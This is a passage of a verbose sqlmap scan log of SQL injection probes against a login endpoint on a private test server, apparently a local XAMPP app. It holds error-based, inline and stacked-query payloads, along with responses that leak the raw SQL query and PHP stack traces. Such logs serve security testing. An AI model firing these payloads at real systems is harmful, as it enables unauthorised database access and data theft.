[03:17:19] [PAYLOAD] test@chatai.com' AND 9851 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(118)+CHAR(107)+CHAR(113)+(SELECT (CASE WHEN (9851=9851) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(118)+CHAR(107)+CHAR(113))) AND 'tnIX'='tnIX
[03:17:19] [TRAFFIC OUT] HTTP request [#31]:
GET /ai/includes/user_login.php?email= test@chatai.com' AND 9851 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(118)+CHAR(107)+CHAR(113)+(SELECT (CASE WHEN (9851=9851) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(118)+CHAR(107)+CHAR(113))) AND 'tnIX'='tnIX&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:17:19] [TRAFFIC IN] HTTP response [#31] (200 OK):
Date: Sun, 19 Oct 2025 07:17:20 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 317
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email= test@chatai.com' AND 9851 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(118)+CHAR(107)+CHAR(113)+(SELECT (CASE WHEN (9851=9851) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(118)+CHAR(107)+CHAR(113))) AND 'tnIX'='tnIX&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = 'test@chatai.com' AND 9851 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(118)+CHAR(107)+CHAR(113)+(SELECT (CASE WHEN (9851=9851) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(118)+CHAR(107)+CHAR(113))) AND 'tnIX'='tnIX'"
    ]
}
[03:17:19] [PAYLOAD] test@chatai.com AND 9851 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(118)+CHAR(107)+CHAR(113)+(SELECT (CASE WHEN (9851=9851) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(118)+CHAR(107)+CHAR(113)))-- oeKH
[03:17:19] [TRAFFIC OUT] HTTP request [#32]:
GET /ai/includes/user_login.php?email= test@chatai.com AND 9851 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(118)+CHAR(107)+CHAR(113)+(SELECT (CASE WHEN (9851=9851) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(118)+CHAR(107)+CHAR(113)))-- oeKH&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:17:20] [TRAFFIC IN] HTTP response [#32] (200 OK):
Date: Sun, 19 Oct 2025 07:17:20 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 306
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=test@chatai.com AND 9851 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(118)+CHAR(107)+CHAR(113)+(SELECT (CASE WHEN (9851=9851) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(118)+CHAR(107)+CHAR(113)))-- oeKH&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = 'test@chatai.com AND 9851 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(118)+CHAR(107)+CHAR(113)+(SELECT (CASE WHEN (9851=9851) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(118)+CHAR(107)+CHAR(113)))-- oeKH'"                                                                                                                                                                     
    ]
}
[03:17:20] [DEBUG] skipping test 'Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (IN)' because the risk (3) is higher than the provided (1)
[03:17:20] [DEBUG] skipping test 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (CONVERT)' because the level (2) is higher than the provided (1)
[03:17:20] [DEBUG] skipping test 'Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (CONVERT)' because the risk (3) is higher than the provided (1)
[03:17:20] [DEBUG] skipping test 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (CONCAT)' because the level (2) is higher than the provided (1)
[03:17:20] [DEBUG] skipping test 'Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (CONCAT)' because the risk (3) is higher than the provided (1)
[03:17:20] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[03:17:20] [PAYLOAD] test@chatai.com) AND 9594=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(118)||CHR(107)||CHR(113)||(SELECT (CASE WHEN (9594=9594) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(118)||CHR(118)||CHR(107)||CHR(113)||CHR(62))) FROM DUAL) AND (3362=3362
[03:17:20] [TRAFFIC OUT] HTTP request [#33]:
GET /ai/includes/user_login.php?email=test@chatai.com) AND 9594=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(118)||CHR(107)||CHR(113)||(SELECT (CASE WHEN (9594=9594) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(118)||CHR(118)||CHR(107)||CHR(113)||CHR(62))) FROM DUAL) AND (3362=3362&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:17:20] [TRAFFIC IN] HTTP response [#33] (200 OK):
Date: Sun, 19 Oct 2025 07:17:20 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 359
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=test@chatai.com) AND 9594=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(118)||CHR(107)||CHR(113)||(SELECT (CASE WHEN (9594=9594) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(118)||CHR(118)||CHR(107)||CHR(113)||CHR(62))) FROM DUAL) AND (3362=3362&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = 'test@chatai.com) AND 9594=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(118)||CHR(107)||CHR(113)||(SELECT (CASE WHEN (9594=9594) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(118)||CHR(118)||CHR(107)||CHR(113)||CHR(62))) FROM DUAL) AND (3362=3362'"                                                                                                                
    ]
}
[03:17:20] [PAYLOAD] test@chatai.com AND 9594=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(118)||CHR(107)||CHR(113)||(SELECT (CASE WHEN (9594=9594) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(118)||CHR(118)||CHR(107)||CHR(113)||CHR(62))) FROM DUAL)
[03:17:20] [TRAFFIC OUT] HTTP request [#34]:
GET /ai/includes/user_login.php?email=test@chatai.com AND 9594=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(118)||CHR(107)||CHR(113)||(SELECT (CASE WHEN (9594=9594) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(118)||CHR(118)||CHR(107)||CHR(113)||CHR(62))) FROM DUAL)&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:17:20] [TRAFFIC IN] HTTP response [#34] (200 OK):
Date: Sun, 19 Oct 2025 07:17:20 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 343
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=test@chatai.com AND 9594=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(118)||CHR(107)||CHR(113)||(SELECT (CASE WHEN (9594=9594) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(118)||CHR(118)||CHR(107)||CHR(113)||CHR(62))) FROM DUAL)&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = 'test@chatai.com AND 9594=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(118)||CHR(107)||CHR(113)||(SELECT (CASE WHEN (9594=9594) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(118)||CHR(118)||CHR(107)||CHR(113)||CHR(62))) FROM DUAL)'"                                                                                                                                
    ]
}
[03:17:20] [PAYLOAD] test@chatai.com') AND 9594=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(118)||CHR(107)||CHR(113)||(SELECT (CASE WHEN (9594=9594) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(118)||CHR(118)||CHR(107)||CHR(113)||CHR(62))) FROM DUAL) AND ('toTD'='toTD
[03:17:20] [TRAFFIC OUT] HTTP request [#35]:
GET /ai/includes/user_login.php?email=test@chatai.com') AND 9594=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(118)||CHR(107)||CHR(113)||(SELECT (CASE WHEN (9594=9594) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(118)||CHR(118)||CHR(107)||CHR(113)||CHR(62))) FROM DUAL) AND ('toTD'='toTD&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:17:20] [TRAFFIC IN] HTTP response [#35] (200 OK):
Date: Sun, 19 Oct 2025 07:17:20 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
X-Powered-By: PHP/7.4.29
Set-Cookie: PHPSESSID=hkb52pok724ms8e5s44eg810j5; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 359
Connection: close
Content-Type: text/html; charset=UTF-8
URI: http://10.10.48.19/ai/includes/user_login.php?email=test@chatai.com') AND 9594=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(118)||CHR(107)||CHR(113)||(SELECT (CASE WHEN (9594=9594) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(118)||CHR(118)||CHR(107)||CHR(113)||CHR(62))) FROM DUAL) AND ('toTD'='toTD&password=123

<br />
<b>Fatal error</b>:  Uncaught Error: Call to a member function fetch_assoc() on bool in C:\xampp\htdocs\ai\includes\functions.php:81
Stack trace:
#0 C:\xampp\htdocs\ai\includes\user_login.php(19): select_single(Object(mysqli), 'user', 'test@chatai.com...')
#1 {main}
  thrown in <b>C:\xampp\htdocs\ai\includes\functions.php</b> on line <b>81</b><br />

[03:17:20] [PAYLOAD] test@chatai.com' AND 9594=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(118)||CHR(107)||CHR(113)||(SELECT (CASE WHEN (9594=9594) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(118)||CHR(118)||CHR(107)||CHR(113)||CHR(62))) FROM DUAL) AND 'CAcv'='CAcv
[03:17:20] [TRAFFIC OUT] HTTP request [#36]:
GET /ai/includes/user_login.php?email=test@chatai.com' AND 9594=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(118)||CHR(107)||CHR(113)||(SELECT (CASE WHEN (9594=9594) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(118)||CHR(118)||CHR(107)||CHR(113)||CHR(62))) FROM DUAL) AND 'CAcv'='CAcv&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:17:20] [TRAFFIC IN] HTTP response [#36] (200 OK):
Date: Sun, 19 Oct 2025 07:17:20 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
X-Powered-By: PHP/7.4.29
Set-Cookie: PHPSESSID=i41v7q9r2in319mb1oe0gflbbo; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 359
Connection: close
Content-Type: text/html; charset=UTF-8
URI: http://10.10.48.19/ai/includes/user_login.php?email=test@chatai.com' AND 9594=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(118)||CHR(107)||CHR(113)||(SELECT (CASE WHEN (9594=9594) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(118)||CHR(118)||CHR(107)||CHR(113)||CHR(62))) FROM DUAL) AND 'CAcv'='CAcv&password=123

<br />
<b>Fatal error</b>:  Uncaught Error: Call to a member function fetch_assoc() on bool in C:\xampp\htdocs\ai\includes\functions.php:81
Stack trace:
#0 C:\xampp\htdocs\ai\includes\user_login.php(19): select_single(Object(mysqli), 'user', 'test@chatai.com...')
#1 {main}
  thrown in <b>C:\xampp\htdocs\ai\includes\functions.php</b> on line <b>81</b><br />

[03:17:20] [PAYLOAD] test@chatai.com AND 9594=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(118)||CHR(107)||CHR(113)||(SELECT (CASE WHEN (9594=9594) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(118)||CHR(118)||CHR(107)||CHR(113)||CHR(62))) FROM DUAL)-- TbbX
[03:17:20] [TRAFFIC OUT] HTTP request [#37]:
GET /ai/includes/user_login.php?email=test@chatai.com AND 9594=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(118)||CHR(107)||CHR(113)||(SELECT (CASE WHEN (9594=9594) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(118)||CHR(118)||CHR(107)||CHR(113)||CHR(62))) FROM DUAL)-- TbbX&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:17:20] [TRAFFIC IN] HTTP response [#37] (200 OK):
Date: Sun, 19 Oct 2025 07:17:20 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 350
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=test@chatai.com AND 9594=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(118)||CHR(107)||CHR(113)||(SELECT (CASE WHEN (9594=9594) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(118)||CHR(118)||CHR(107)||CHR(113)||CHR(62))) FROM DUAL)-- TbbX&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = 'test@chatai.com AND 9594=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(118)||CHR(107)||CHR(113)||(SELECT (CASE WHEN (9594=9594) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(118)||CHR(118)||CHR(107)||CHR(113)||CHR(62))) FROM DUAL)-- TbbX'"                                                                                                                         
    ]
}
[03:17:20] [DEBUG] skipping test 'Oracle OR error-based - WHERE or HAVING clause (XMLType)' because the risk (3) is higher than the provided (1)
[03:17:20] [DEBUG] skipping test 'Oracle AND error-based - WHERE or HAVING clause (UTL_INADDR.GET_HOST_ADDRESS)' because the level (2) is higher than the provided (1)
[03:17:20] [DEBUG] skipping test 'Oracle OR error-based - WHERE or HAVING clause (UTL_INADDR.GET_HOST_ADDRESS)' because the risk (3) is higher than the provided (1)
[03:17:20] [DEBUG] skipping test 'Oracle AND error-based - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)' because the level (3) is higher than the provided (1)
[03:17:20] [DEBUG] skipping test 'Oracle OR error-based - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)' because the risk (3) is higher than the provided (1)
[03:17:20] [DEBUG] skipping test 'Oracle AND error-based - WHERE or HAVING clause (DBMS_UTILITY.SQLID_TO_SQLHASH)' because the level (4) is higher than the provided (1)
[03:17:20] [DEBUG] skipping test 'Oracle OR error-based - WHERE or HAVING clause (DBMS_UTILITY.SQLID_TO_SQLHASH)' because the risk (3) is higher than the provided (1)
[03:17:20] [DEBUG] skipping test 'Firebird AND error-based - WHERE or HAVING clause' because the level (3) is higher than the provided (1)
[03:17:20] [DEBUG] skipping test 'Firebird OR error-based - WHERE or HAVING clause' because the risk (3) is higher than the provided (1)
[03:17:20] [DEBUG] skipping test 'MonetDB AND error-based - WHERE or HAVING clause' because the level (3) is higher than the provided (1)
[03:17:20] [DEBUG] skipping test 'MonetDB OR error-based - WHERE or HAVING clause' because the risk (3) is higher than the provided (1)
[03:17:20] [DEBUG] skipping test 'Vertica AND error-based - WHERE or HAVING clause' because the level (3) is higher than the provided (1)
[03:17:20] [DEBUG] skipping test 'Vertica OR error-based - WHERE or HAVING clause' because the risk (3) is higher than the provided (1)
[03:17:20] [DEBUG] skipping test 'IBM DB2 AND error-based - WHERE or HAVING clause' because the level (3) is higher than the provided (1)
[03:17:20] [DEBUG] skipping test 'IBM DB2 OR error-based - WHERE or HAVING clause' because the risk (3) is higher than the provided (1)
[03:17:20] [DEBUG] skipping test 'ClickHouse AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause' because the level (3) is higher than the provided (1)
[03:17:20] [DEBUG] skipping test 'ClickHouse OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause' because the risk (3) is higher than the provided (1)
[03:17:20] [DEBUG] skipping test 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)' because the level (2) is higher than the provided (1)
[03:17:20] [DEBUG] skipping test 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)' because the level (5) is higher than the provided (1)
[03:17:20] [DEBUG] skipping test 'MySQL >= 5.5 error-based - Parameter replace (EXP)' because the level (5) is higher than the provided (1)
[03:17:20] [DEBUG] skipping test 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)' because the level (5) is higher than the provided (1)
[03:17:20] [DEBUG] skipping test 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)' because the level (5) is higher than the provided (1)
[03:17:20] [DEBUG] skipping test 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)' because the level (2) is higher than the provided (1)
[03:17:20] [DEBUG] skipping test 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)' because the level (4) is higher than the provided (1)
[03:17:20] [DEBUG] skipping test 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)' because the level (2) is higher than the provided (1)
[03:17:20] [DEBUG] skipping test 'PostgreSQL error-based - Parameter replace' because the level (2) is higher than the provided (1)
[03:17:20] [DEBUG] skipping test 'PostgreSQL error-based - Parameter replace (GENERATE_SERIES)' because the level (5) is higher than the provided (1)
[03:17:20] [DEBUG] skipping test 'Microsoft SQL Server/Sybase error-based - Parameter replace' because the level (3) is higher than the provided (1)
[03:17:20] [DEBUG] skipping test 'Microsoft SQL Server/Sybase error-based - Parameter replace (integer column)' because the level (4) is higher than the provided (1)
[03:17:20] [DEBUG] skipping test 'Oracle error-based - Parameter replace' because the level (3) is higher than the provided (1)
[03:17:20] [DEBUG] skipping test 'Firebird error-based - Parameter replace' because the level (4) is higher than the provided (1)
[03:17:20] [DEBUG] skipping test 'IBM DB2 error-based - Parameter replace' because the level (4) is higher than the provided (1)
[03:17:20] [DEBUG] skipping test 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (BIGINT UNSIGNED)' because the level (5) is higher than the provided (1)
[03:17:20] [DEBUG] skipping test 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (EXP)' because the level (5) is higher than the provided (1)
[03:17:20] [DEBUG] skipping test 'MySQL >= 5.6 error-based - ORDER BY, GROUP BY clause (GTID_SUBSET)' because the level (5) is higher than the provided (1)
[03:17:20] [DEBUG] skipping test 'MySQL >= 5.7.8 error-based - ORDER BY, GROUP BY clause (JSON_KEYS)' because the level (5) is higher than the provided (1)
[03:17:20] [DEBUG] skipping test 'MySQL >= 5.0 error-based - ORDER BY, GROUP BY clause (FLOOR)' because the level (4) is higher than the provided (1)
[03:17:20] [DEBUG] skipping test 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (EXTRACTVALUE)' because the level (3) is higher than the provided (1)
[03:17:20] [DEBUG] skipping test 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (UPDATEXML)' because the level (5) is higher than the provided (1)
[03:17:20] [DEBUG] skipping test 'MySQL >= 4.1 error-based - ORDER BY, GROUP BY clause (FLOOR)' because the level (3) is higher than the provided (1)
[03:17:20] [DEBUG] skipping test 'PostgreSQL error-based - ORDER BY, GROUP BY clause' because the level (3) is higher than the provided (1)
[03:17:20] [DEBUG] skipping test 'PostgreSQL error-based - ORDER BY, GROUP BY clause (GENERATE_SERIES)' because the level (5) is higher than the provided (1)
[03:17:20] [DEBUG] skipping test 'Microsoft SQL Server/Sybase error-based - ORDER BY clause' because the level (4) is higher than the provided (1)
[03:17:20] [DEBUG] skipping test 'Oracle error-based - ORDER BY, GROUP BY clause' because the level (4) is higher than the provided (1)
[03:17:20] [DEBUG] skipping test 'Firebird error-based - ORDER BY clause' because the level (5) is higher than the provided (1)
[03:17:20] [DEBUG] skipping test 'IBM DB2 error-based - ORDER BY clause' because the level (5) is higher than the provided (1)
[03:17:20] [DEBUG] skipping test 'Microsoft SQL Server/Sybase error-based - Stacking (EXEC)' because the level (2) is higher than the provided (1)

[03:17:20] [INFO] testing 'Generic inline queries'
[03:17:20] [PAYLOAD] (SELECT CONCAT(CONCAT('qvvkq',(CASE WHEN (8932=8932) THEN '1' ELSE '0' END)),'qvvkq'))
[03:17:20] [TRAFFIC OUT] HTTP request [#38]:
GET /ai/includes/user_login.php?email=(SELECT CONCAT(CONCAT('qvvkq',(CASE WHEN (8932=8932) THEN '1' ELSE '0' END)),'qvvkq'))&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:17:20] [TRAFFIC IN] HTTP response [#38] (200 OK):
Date: Sun, 19 Oct 2025 07:17:20 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
X-Powered-By: PHP/7.4.29
Set-Cookie: PHPSESSID=fee1jpdect6teutabdqofl42b9; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 359
Connection: close
Content-Type: text/html; charset=UTF-8
URI: http://10.10.48.19/ai/includes/user_login.php?email=(SELECT CONCAT(CONCAT('qvvkq',(CASE WHEN (8932=8932) THEN '1' ELSE '0' END)),'qvvkq'))&password=123

<br />
<b>Fatal error</b>:  Uncaught Error: Call to a member function fetch_assoc() on bool in C:\xampp\htdocs\ai\includes\functions.php:81
Stack trace:
#0 C:\xampp\htdocs\ai\includes\user_login.php(19): select_single(Object(mysqli), 'user', '(SELECT CONCAT(...')
#1 {main}
  thrown in <b>C:\xampp\htdocs\ai\includes\functions.php</b> on line <b>81</b><br />

[03:17:20] [DEBUG] skipping test 'MySQL inline queries' because the level (2) is higher than the provided (1)
[03:17:20] [DEBUG] skipping test 'PostgreSQL inline queries' because the level (2) is higher than the provided (1)
[03:17:20] [DEBUG] skipping test 'Microsoft SQL Server/Sybase inline queries' because the level (2) is higher than the provided (1)
[03:17:20] [DEBUG] skipping test 'Oracle inline queries' because the level (2) is higher than the provided (1)
[03:17:20] [DEBUG] skipping test 'SQLite inline queries' because the level (3) is higher than the provided (1)
[03:17:20] [DEBUG] skipping test 'Firebird inline queries' because the level (3) is higher than the provided (1)
[03:17:20] [DEBUG] skipping test 'ClickHouse inline queries' because the level (3) is higher than the provided (1)
[03:17:20] [DEBUG] skipping test 'MySQL >= 5.0.12 stacked queries (comment)' because the level (2) is higher than the provided (1)
[03:17:20] [DEBUG] skipping test 'MySQL >= 5.0.12 stacked queries' because the level (3) is higher than the provided (1)
[03:17:20] [DEBUG] skipping test 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)' because the level (3) is higher than the provided (1)
[03:17:20] [DEBUG] skipping test 'MySQL >= 5.0.12 stacked queries (query SLEEP)' because the level (4) is higher than the provided (1)
[03:17:20] [DEBUG] skipping test 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)' because the risk (2) is higher than the provided (1)
[03:17:20] [DEBUG] skipping test 'MySQL < 5.0.12 stacked queries (BENCHMARK)' because the risk (2) is higher than the provided (1)
[03:17:20] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[03:17:20] [PAYLOAD] test@chatai.com);SELECT PG_SLEEP(5)--
[03:17:20] [TRAFFIC OUT] HTTP request [#39]:
GET /ai/includes/user_login.php?email=test%40chatai.com%29%3BSELECT%20PG_SLEEP%285%29--&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:17:20] [TRAFFIC IN] HTTP response [#39] (200 OK):
Date: Sun, 19 Oct 2025 07:17:20 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 133
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=test@chatai.com);SELECT PG_SLEEP(5)--&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = 'test@chatai.com);SELECT PG_SLEEP(5)--'"
    ]
}
[03:17:20] [PAYLOAD] test@chatai.com;SELECT PG_SLEEP(5)--
[03:17:20] [TRAFFIC OUT] HTTP request [#40]:
GET /ai/includes/user_login.php?email=test%40chatai.com%3BSELECT%20PG_SLEEP%285%29--&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:17:20] [TRAFFIC IN] HTTP response [#40] (200 OK):
Date: Sun, 19 Oct 2025 07:17:20 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 132
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=test%40chatai.com%3BSELECT%20PG_SLEEP%285%29--&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = 'test@chatai.com;SELECT PG_SLEEP(5)--'"
    ]
}
[03:17:20] [PAYLOAD] test@chatai.com');SELECT PG_SLEEP(5)--
[03:17:20] [TRAFFIC OUT] HTTP request [#41]:
GET /ai/includes/user_login.php?email=test%40chatai.com%27%29%3BSELECT%20PG_SLEEP%285%29--&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:17:20] [TRAFFIC IN] HTTP response [#41] (200 OK):
Date: Sun, 19 Oct 2025 07:17:21 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
X-Powered-By: PHP/7.4.29
Set-Cookie: PHPSESSID=i41g20v52hma2ah41c4qqbn98q; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 359
Connection: close
Content-Type: text/html; charset=UTF-8
URI: http://10.10.48.19/ai/includes/user_login.php?email=test%40chatai.com%27%29%3BSELECT%20PG_SLEEP%285%29--&password=123

<br />
<b>Fatal error</b>:  Uncaught Error: Call to a member function fetch_assoc() on bool in C:\xampp\htdocs\ai\includes\functions.php:81
Stack trace:
#0 C:\xampp\htdocs\ai\includes\user_login.php(19): select_single(Object(mysqli), 'user', 'test@chatai.com...')
#1 {main}
  thrown in <b>C:\xampp\htdocs\ai\includes\functions.php</b> on line <b>81</b><br />

[03:17:20] [PAYLOAD] test@chatai.com';SELECT PG_SLEEP(5)--
[03:17:20] [TRAFFIC OUT] HTTP request [#42]:
GET /ai/includes/user_login.php?email=test%40chatai.com%27%3BSELECT%20PG_SLEEP%285%29--&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:17:20] [TRAFFIC IN] HTTP response [#42] (200 OK):
Date: Sun, 19 Oct 2025 07:17:21 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
X-Powered-By: PHP/7.4.29
Set-Cookie: PHPSESSID=r43lvei7hp2tdfpg1rdbntv2vi; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
